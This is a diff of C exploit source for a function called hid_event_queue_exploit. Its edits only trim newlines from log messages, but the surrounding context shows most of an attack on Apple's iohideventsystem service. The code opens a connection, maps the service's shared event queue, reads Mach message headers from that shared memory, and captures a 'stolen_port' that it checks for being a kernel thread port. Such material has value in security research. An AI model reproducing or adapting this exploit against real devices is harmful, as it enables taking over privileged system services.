@@ -95,23 +95,23 @@ mach_port_t hid_event_queue_exploit()
 
     err = bootstrap_look_up(bootstrap_port, "com.apple.iohideventsystem", &service_port);
     if (err != KERN_SUCCESS || service_port == MACH_PORT_NULL) {
-        LOG("failed to lookup service\n");
+        LOG("failed to lookup service");
         exit(EXIT_FAILURE);
     }
 
-    LOG("got service port: 0x%x\n", service_port);
+    LOG("got service port: 0x%x", service_port);
 
     /* open a client connection */
 
     mach_port_t a_receive_right = MACH_PORT_NULL;
     err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &a_receive_right);
     if (err != KERN_SUCCESS) {
-        LOG("failed to allocate receive right\n");
+        LOG("failed to allocate receive right");
         exit(EXIT_FAILURE);
     }
 
     err = mach_port_insert_right(mach_task_self(), a_receive_right, a_receive_right, MACH_MSG_TYPE_MAKE_SEND);
-    LOG("allocated a receive right 0x%x, we'll give hideventsystem a send to this\n", a_receive_right);
+    LOG("allocated a receive right 0x%x, we'll give hideventsystem a send to this", a_receive_right);
 
     mach_port_t connection_port = MACH_PORT_NULL;
 
@@ -126,19 +126,19 @@ mach_port_t hid_event_queue_exploit()
         a_receive_right,
         &connection_port);
 
-    LOG("err: %x\n", err);
-    LOG("connection_port: %x\n", connection_port);
-    LOG("a_receive_right: %x\n", a_receive_right);
+    LOG("err: %x", err);
+    LOG("connection_port: %x", connection_port);
+    LOG("a_receive_right: %x", a_receive_right);
 
     if (err != KERN_SUCCESS) {
-        LOG("failed to open hideventsystem connection\n");
+        LOG("failed to open hideventsystem connection");
         exit(EXIT_FAILURE);
     }
 
     /* clear the cache */
     err = io_hideventsystem_clear_service_cache(connection_port);
     if (err != KERN_SUCCESS) {
-        LOG("failed to clear service cache, err: %x\n", err);
+        LOG("failed to clear service cache, err: %x", err);
         exit(EXIT_FAILURE);
     }
 
@@ -157,7 +157,7 @@ mach_port_t hid_event_queue_exploit()
         &service_ids_out_len);
 
     if (err != KERN_SUCCESS) {
-        LOG("failed to copy matching services, err: %x\n", err);
+        LOG("failed to copy matching services, err: %x", err);
         exit(EXIT_FAILURE);
     }
 
@@ -169,16 +169,16 @@ mach_port_t hid_event_queue_exploit()
         mach_vm_deallocate(mach_task_self(), service_ids_out, service_ids_out_len);
     }
 
-    LOG("copied matching services\n");
+    LOG("copied matching services");
 
     mach_port_t notification_port = MACH_PORT_NULL;
     err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &notification_port);
     if (err != KERN_SUCCESS) {
-        LOG("failed to allocate receive right for notification port\n");
+        LOG("failed to allocate receive right for notification port");
         exit(EXIT_FAILURE);
     }
 
-    LOG("allocated a recieve right for notifications: 0x%x\n", notification_port);
+    LOG("allocated a recieve right for notifications: 0x%x", notification_port);
 
     mach_port_t queue_memory_entry = MACH_PORT_NULL;
 
@@ -189,13 +189,13 @@ mach_port_t hid_event_queue_exploit()
         &queue_memory_entry);
 
     if (err != KERN_SUCCESS) {
-        LOG("failed to create queue, err: %x\n", err);
+        LOG("failed to create queue, err: %x", err);
         exit(EXIT_FAILURE);
     }
 
-    LOG("queue memory entry port: 0x%x\n", queue_memory_entry);
+    LOG("queue memory entry port: 0x%x", queue_memory_entry);
 
-    LOG("pid %d\n", getpid());
+    LOG("pid %d", getpid());
 
     // map the queue:
     mach_vm_address_t queue_address = 0;
@@ -213,17 +213,17 @@ mach_port_t hid_event_queue_exploit()
         2); // inheritance
 
     if (err != KERN_SUCCESS) {
-        LOG("mach_vm_map failed: %x\n", err);
+        LOG("mach_vm_map failed: %x", err);
         exit(EXIT_FAILURE);
     }
 
-    LOG("mapped queue: %p\n", (void*)queue_address);
+    LOG("mapped queue: %p", (void*)queue_address);
 
     volatile mach_msg_header_t* shm_msg = (mach_msg_header_t*)(queue_address + 0x8000 + 0x10);
 
-    LOG("got the shared memory msg mapped at: %p\n", shm_msg);
-    LOG("%08x %08x %08x\n", shm_msg->msgh_bits, shm_msg->msgh_size, shm_msg->msgh_remote_port);
-    LOG("%08x %08x %08x\n", shm_msg->msgh_local_port, shm_msg->msgh_voucher_port, shm_msg->msgh_id);
+    LOG("got the shared memory msg mapped at: %p", shm_msg);
+    LOG("%08x %08x %08x", shm_msg->msgh_bits, shm_msg->msgh_size, shm_msg->msgh_remote_port);
+    LOG("%08x %08x %08x", shm_msg->msgh_local_port, shm_msg->msgh_voucher_port, shm_msg->msgh_id);
 
     uint32_t saved_bits = shm_msg->msgh_bits;
     uint32_t saved_local_port = shm_msg->msgh_local_port;
@@ -238,13 +238,13 @@ mach_port_t hid_event_queue_exploit()
         connection_port);
 
     if (err != KERN_SUCCESS) {
-        LOG("failed to start the event queue\n");
+        LOG("failed to start the event queue");
     }
 
-    LOG("started queue\n");
+    LOG("started queue");
 
     // wait to receive a message
-    LOG("if nothing happens here for a while, interact with the screen\n");
+    LOG("if nothing happens here for a while, interact with the screen");
 
     mach_msg_header_t* received_msg = malloc(0x1000);
 
@@ -256,15 +256,15 @@ mach_port_t hid_event_queue_exploit()
         notification_port,
         0,
         0);
-    LOG("mach_msg returned\n");
+    LOG("mach_msg returned");
 
     if (err != KERN_SUCCESS) {
-        LOG("tried to receive a message on the notification port but failed, err: %x\n", err);
+        LOG("tried to receive a message on the notification port but failed, err: %x", err);
         exit(EXIT_FAILURE);
     }
 
-    LOG("msgh_id of received notification message: %x\n", received_msg->msgh_id);
-    LOG("did we get an interesting port? 0x%x\n", received_msg->msgh_remote_port);
+    LOG("msgh_id of received notification message: %x", received_msg->msgh_id);
+    LOG("did we get an interesting port? 0x%x", received_msg->msgh_remote_port);
 
     mach_port_t stolen_port = received_msg->msgh_remote_port;
 
@@ -273,15 +273,15 @@ mach_port_t hid_event_queue_exploit()
     mach_vm_address_t kaddr = 0;
     err = mach_port_kobject(mach_task_self(), stolen_port, &ktype, &kaddr);
     if (err != KERN_SUCCESS) {
-        LOG("unable to get mach port ktype\n");
+        LOG("unable to get mach port ktype");
         sleep(100);
     }
 
-    LOG("kernel object type: %d\n", ktype);
+    LOG("kernel object type: %d", ktype);
 
     // is that a thread port?
     if (ktype != 1) {
-        LOG("not a thread port...\n");
+        LOG("not a thread port...");
     }
 
     // cleanup:
@@ -293,7 +293,7 @@ mach_port_t hid_event_queue_exploit()
 
     err = io_hideventsystem_queue_stop(connection_port);
     if (err != KERN_SUCCESS) {
-        LOG("unable to stop the queue\n");
+        LOG("unable to stop the queue");
     }
 
     // unmap the queue
